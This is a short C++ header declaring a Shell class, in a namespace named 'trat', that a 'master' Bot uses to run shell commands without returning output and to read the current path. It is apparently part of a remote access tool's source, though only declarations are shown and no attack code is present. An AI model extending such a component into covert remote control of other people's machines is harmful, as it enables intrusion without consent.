#ifndef SHELL_HPP
#define SHELL_HPP

#include <cstring>

#define SHELL_RESPONSE_BUFFER_SIZE

namespace trat 
{
  typedef struct 
  {
    bool isSuccessful;             // Indicates success of the operation
    char response[512];          // Response from the shell or bot
  }ShellResponse;

  class Bot;
  
  class Shell 
  {
    private:
      Bot* masterBot;
    public:
      Shell(trat::Bot* MasterBot);  
      
      char* getCurrentPath();
        
      bool executeShellCommandWithoutResponse(const char* Command);
        
    };

} // namespace trat

#endif // SHELL_HPP
